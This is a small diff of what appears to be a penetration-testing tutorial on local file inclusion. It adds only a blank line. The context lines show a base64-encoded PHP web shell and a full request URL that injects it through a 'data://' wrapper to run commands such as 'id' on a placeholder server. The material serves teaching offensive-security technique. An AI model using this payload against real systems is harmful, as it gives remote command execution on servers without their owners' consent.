@@ -36,6 +36,7 @@ PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
 ```
 
 Finally, we can use pass commands to the web shell with `&cmd=<COMMAND>`:
+
 ```
 http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
 ```
